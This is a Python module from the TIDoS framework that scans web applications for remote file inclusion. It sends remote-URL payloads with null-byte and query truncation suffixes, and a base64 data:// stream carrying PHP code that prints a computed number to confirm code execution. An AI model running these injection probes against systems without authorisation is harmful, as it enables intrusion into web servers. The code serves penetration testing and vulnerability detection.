#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework

"""Remote file inclusion through request parameters."""

from __future__ import annotations

import base64
import re
from urllib.parse import urljoin

from core.methods import fileinj, inject
from core.methods import modkit as kit
from core.methods import webinj
from core.methods.print import pvln

DEFAULT_URL = "http://example.com/"
DEFAULT_MARK = "Example Domain"

info = ("Finds remote file inclusion in request parameters. Each parameter is set to a remote URL "
        f"(RFIURL, default {DEFAULT_URL}) with and without suffix-truncation tricks; the finding is "
        "confirmed when the remote file's marker (RFIMARK, default: the page title) appears in the "
        "response but not in the baseline. This proves the server fetched and embedded the remote file; "
        "to prove code execution, host a PHP file that prints a computed value (e.g. <?php echo 1337*7331; ?> "
        "with RFIMARK 9801547) and point RFIURL at it. A data:// stream carrying PHP that prints the product "
        "of two random numbers is also tried (needs allow_url_include). Include errors naming the injected "
        "URL are reported as low-confidence hints. DICT optionally tests a list of known vulnerable "
        "application paths (files/fuzz-db/rfi_paths.lst, XXpathXX marks the parameter).")
searchinfo = "Remote File Inclusion Scanner"
properties = {
    **inject.OPTIONS,
    **webinj.COOKIE_OPTION,
    "RFIURL": [f"Remote file to include (default {DEFAULT_URL})", ""],
    "RFIMARK": ["Text in the remote file that proves inclusion (default: its <title>)", ""],
    "DICT": ["Also test known vulnerable-app paths from this list, e.g. files/fuzz-db/rfi_paths.lst "
             "(empty: skip)", ""],
}

CONFIRMED = "RFI (confirmed)"
CODE = "RFI (confirmed, PHP executed via data://)"
POSSIBLE = "RFI (possible, low confidence)"
SUFFIXES = ("", "?", "%00", "#")


def remote_marker(s, url: str, mark: str) -> str:
    """The marker to look for; checks that the remote file really contains it."""
    try:
        text = s.get(url).text
    except Exception as e:
        kit.warn(f"Cannot fetch {url} from here ({type(e).__name__}); the target may still reach it.")
        if not mark:
            mark = DEFAULT_MARK if url == DEFAULT_URL else ""
        return mark
    if not mark:
        m = re.search(r"<title>\s*([^<]{6,80}?)\s*</title>", text, re.I)
        mark = m.group(1) if m else (DEFAULT_MARK if url == DEFAULT_URL else "")
    if mark and mark not in text:
        kit.warn(f"'{mark}' is not in {url} as fetched from here; check RFIURL/RFIMARK.")
    return mark


def known_points(web, path: str) -> list[inject.Point]:
    points = []
    for line in kit.wordlist(path):
        if "XXpathXX" not in line:
            continue
        url = urljoin(kit.url(web) + "/", line.lstrip("/")).replace("XXpathXX", "TIDRFI").rstrip("?")
        points += [p for p in inject.from_url(url) if p.original == "TIDRFI"]
    return points


def check(point: inject.Point, s, url: str, mark: str):
    baseline = fileinj.body(point.send(s, point.original)) + fileinj.body(point.send(s, inject.marker()))

    if mark and mark not in baseline:
        for suffix in SUFFIXES:
            payload = url + suffix
            if mark in fileinj.body(fileinj.send(point, s, payload)):
                yield inject.Finding(point, payload, f"remote file content '{mark}' included", CONFIRMED)
                return

    a, b = fileinj.numbers()
    code = base64.b64encode(f"<?php print({a}*{b}); ?>".encode()).decode()
    payload = f"data://text/plain;base64,{code}"
    if str(a * b) not in baseline and str(a * b) in fileinj.body(point.send(s, payload)):
        yield inject.Finding(point, payload, f"PHP in a data:// stream printed {a}*{b}={a * b}", CODE)
        return

    token = inject.marker()
    payload = f"http://{token}.invalid/{token}.php"
    err = fileinj.inclusion_error(fileinj.body(point.send(s, payload)), baseline, token)
    if err:
        yield inject.Finding(point, payload, f"include error names the injected URL: {err}", POSSIBLE)


def rfi(web):
    pvln("remote file inclusion")
    rec = kit.Recorder(web, kit.CRITICAL, "rfi")
    s = webinj.session(properties, timeout=20)
    url = kit.option(properties, "RFIURL", "Remote file to include", DEFAULT_URL) or DEFAULT_URL
    mark = remote_marker(s, url, kit.option(properties, "RFIMARK", "Text that proves inclusion", ""))
    if mark and mark in url:
        kit.bad("RFIMARK must not appear in RFIURL itself (an echoed URL would match).")
        return []
    if not mark:
        kit.warn("No marker for RFIURL (set RFIMARK); only data:// and error checks will run.")
    else:
        kit.info(f"Remote file: {url}  marker: '{mark}'")

    points = inject.discover(web, properties)
    known = kit.option(properties, "DICT", "Known vulnerable-app path list (enter to skip)", "")
    if known:
        extra = known_points(web, known)
        kit.info(f"{len(extra)} known application path(s) added from {known}.")
        points += extra
    if not points:
        rec("No injection points found.")
        return []
    findings = inject.scan(points, lambda p: check(p, s, url, mark))
    inject.report(findings, rec, clean="No remote file inclusion found.")
    return findings


def attack(web):
    rfi(web)
